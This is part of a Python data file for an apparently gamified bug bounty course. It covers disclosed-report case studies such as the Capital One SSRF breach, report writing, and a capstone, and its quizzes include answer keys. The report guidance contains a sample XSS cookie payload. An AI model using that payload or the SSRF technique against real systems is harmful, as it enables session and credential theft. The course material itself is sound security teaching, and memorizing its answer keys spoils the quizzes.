        "subtitle": "Level 28: Learning from Real-World Bugs",
        "description": "Study actual bug bounty reports to understand how hunters think, what they find, and how they report it.",
        "topics": [
            {"name": "Analyzing HackerOne Disclosed Reports", "content": "HackerOne Hacktivity shows disclosed reports. Analyze: vulnerability type, endpoint, payload, impact, bounty amount. Learn from: how the hunter found it, how they demonstrated impact, how they wrote the report. Top 10 most common types: IDOR, XSS, information disclosure, CSRF, SSRF, privilege escalation, SQLi, subdomain takeover, race conditions, business logic.", "emoji": "📋"},
            {"name": "Twitter's OAuth Redirect Chain", "content": "Case: Twitter's OAuth flow had an open redirect in the oauth/authenticate endpoint. Combined with token leakage via Referer header, attackers could steal authorization codes. Chained with subdomain takeover of ads.twitter.com served malicious content. Impact: full account takeover. Bounty: $25,000+.", "emoji": "🐦"},
            {"name": "Capital One SSRF Breach (2019)", "content": "The attacker exploited SSRF against AWS metadata endpoint (169.254.169.254) via a misconfigured WAF. Extracted IAM credentials for the role attached to the EC2 instance. Exfiltrated 100M+ credit card applications. Fine: $190M. This single vulnerability type changed how cloud SSRF is prioritized.", "emoji": "🏦"},
            {"name": "Lessons from Top Bug Bounty Hunters", "content": "Patterns from top earners: spend 80% time on recon, read every disclosed report, develop custom automation, specialize in one area (SSRF, GraphQL, logic bugs), write exceptional reports, collaborate with other hunters, never give up after rejection. Top hunters earn $1M+/year.", "emoji": "🏆"},
        ],
        "task": {"title": "Disclosed Report Analysis", "description": "Go to HackerOne Hacktivity. Find a disclosed report with bounty >$1000. Analyze: 1) Vulnerability type, 2) How was it found?, 3) What was the impact?, 4) How was it reported?, 5) What can you learn for your own testing?", "expected_answer": "Deep analysis of a real disclosed bug bounty report.", "xp_reward": 300},
        "interview_prompt": "What can we learn from analyzing disclosed bug bounty reports? Describe a real-world attack chain and its impact.",
        "key_concepts": ["case study", "hackerone", "hacktivity", "disclosed report", "capital one breach", "twitter oauth", "top hunters"],
        "quiz": [
            {"q": "Where can you see disclosed HackerOne reports?", "opts": ["HackerOne Blog", "Hacktivity page", "GitHub", "Twitter"], "ans": 1},
            {"q": "What caused the Capital One breach?", "opts": ["SQL injection", "SSRF against cloud metadata", "XSS", "Phishing"], "ans": 1},
            {"q": "What percentage of time do top hunters spend on recon?", "opts": ["20%", "50%", "80%", "100%"], "ans": 2},
        ], "xp_reward": 300
    },
    29: {
        "title": "Report Writing & Professional Communication",
        "subtitle": "Level 29: Getting Paid for Your Work",
        "description": "A great vulnerability with a poor report gets a low bounty. A good vulnerability with an excellent report gets top dollar.",
        "topics": [
            {"name": "Anatomy of a Perfect Report", "content": "Title: clear, specific, includes type and endpoint. Summary: one-paragraph description. Steps to Reproduce: numbered, exact requests/responses, copy-pasteable. Impact: what an attacker can actually achieve — be specific. Remediation: how to fix it. POC: screenshot or video. Severity: your assessment. References: OWASP, CWE links.", "emoji": "📝"},
            {"name": "Writing Clear Steps to Reproduce", "content": "Bad: 'XSS exists on the search page.' Good: '1. Navigate to https://example.com/search 2. Enter: <script>alert(document.cookie)</script> 3. Click search 4. Observe JavaScript alert showing the session cookie: abc123'. Include full HTTP request from Burp. A triager should be able to reproduce in <2 minutes.", "emoji": "📋"},
            {"name": "Impact Communication & Severity", "content": "Don't inflate impact — triagers detect it. Do articulate real risk: 'Attacker can steal session cookies of any user visiting the search page, leading to full account takeover without user interaction.' Severity guidelines: critical (RCE, data breach), high (account takeover, SSRF to metadata), medium (stored XSS), low (missing security headers).", "emoji": "📊"},
            {"name": "Dealing with Rejections & Bounty Negotiation", "content": "Rejection reasons: duplicate, out of scope, not exploitable, expected behavior. Learn from each. If you disagree, professionally explain (with evidence) why it should be accepted. Never argue or threaten. Negotiation: ask triagers what would increase severity. Build reputation by being professional.", "emoji": "🤝"},
        ],
        "task": {"title": "Write a Sample Report", "description": "Write a complete bug bounty report for a vulnerability you've learned about (IDOR, XSS, etc.). Include: title, summary, steps to reproduce (with mock HTTP request/response), impact assessment, remediation suggestion, and 2-3 CWE/OWASP references.", "expected_answer": "A professional-quality sample bug bounty report.", "xp_reward": 300},
        "interview_prompt": "What makes a bug bounty report excellent? How do you communicate impact and handle rejections?",
        "key_concepts": ["report writing", "bug bounty report", "steps to reproduce", "impact", "severity", "remediation", "negotiation"],
        "quiz": [
            {"q": "How fast should a triager reproduce your bug?", "opts": ["<30 minutes", "<2 minutes", "<1 hour", "<1 day"], "ans": 1},
            {"q": "What should you include in steps to reproduce?", "opts": ["Just the vulnerability type", "Exact requests with payloads and expected responses", "Only the final exploit", "A link to a blog post"], "ans": 1},
            {"q": "How should you handle a rejected report?", "opts": ["Argue aggressively", "Learn from the feedback and professionally explain if valid", "Submit to another program", "Ignore it"], "ans": 1},
        ], "xp_reward": 300
    },
    30: {
        "title": "Final Capstone Simulation + AI Interview Assessment",
        "subtitle": "Level 30: The Ultimate Test",
        "description": "Combine everything you've learned. Complete a simulated bug bounty engagement and pass the final AI interview.",
        "topics": [
            {"name": "Capstone Overview", "content": "You'll be given a simulated target application. Your mission: perform a complete bug bounty engagement from recon to report. Phases: 1) Recon (passive + active) — find all subdomains, endpoints, technologies, 2) Attack surface mapping — document everything, 3) Vulnerability testing — test at least 3 different vulnerability types, 4) Exploitation — demonstrate real impact, 5) Reporting — write a professional report for one confirmed finding.", "emoji": "🎯"},
            {"name": "Simulated Target Methodology", "content": "Approach systematically: 1) Start with passive recon (no scanning), 2) Move to active recon (subdomain discovery, port scanning), 3) Map the application (endpoints, parameters, auth), 4) Test for common vulns (IDOR, XSS, SQLi, SSRF), 5) Chain findings for maximum impact, 6) Document everything. Take notes at every step — your notes are how you'll be graded.", "emoji": "🗺️"},
            {"name": "AI Interview Preparation", "content": "The final interview tests: 1) Technical knowledge (30%): questions across all vulnerability types, 2) Practical methodology (25%): how you approach a target, 3) Problem-solving (25%): given a scenario, how would you find and exploit?, 4) Professional communication (20%): how you explain findings and write reports. Review all previous levels thoroughly.", "emoji": "🎓"},
            {"name": "Capstone Rubric & Requirements", "content": "Passing requires: minimum score of 85/100 across all dimensions. Technical (30): demonstrate deep understanding of at least 3 vulnerability types. Methodology (25): show systematic approach. Communication (25): write clear, professional report. Real-world (20): demonstrate understanding of real bug bounty workflow. You have unlimited attempts — but you must truly master the material.", "emoji": "✅"},
        ],
        "task": {"title": "Complete Capstone Simulation", "description": "Run through a complete simulated engagement: 1) Choose any target application you have authorization to test or use a purposely vulnerable lab (e.g., PortSwigger, DVWA, HackTheBox), 2) Perform full recon, 3) Find at least 2 vulnerabilities, 4) Write professional reports for both, 5) Submit for evaluation.", "expected_answer": "Complete engagement documentation including recon data, vulnerability findings, and professional reports.", "xp_reward": 1000},
        "interview_prompt": "Describe how you would approach a completely new bug bounty target from start to finish. Walk through your methodology step by step, including recon, vulnerability testing, exploitation, and reporting. Give an example of a complex attack chain you could build.",
        "key_concepts": ["capstone", "simulation", "full engagement", "recon", "testing", "exploitation", "reporting", "ai interview", "graduation"],
        "quiz": [
            {"q": "What is the first phase of a bug bounty engagement?", "opts": ["Exploitation", "Reconnaissance", "Reporting", "Vulnerability scanning"], "ans": 1},
            {"q": "How many vulnerability types should you test in the capstone?", "opts": ["1", "At least 3", "5", "All 30 levels worth"], "ans": 1},
            {"q": "What passing score is required for the final interview?", "opts": ["70/100", "85/100", "90/100", "100/100"], "ans": 1},
        ], "xp_reward": 500
    },
}


TOTAL_LEVELS = 30


def get_level(level_number: int):
    return LEVELS.get(level_number)
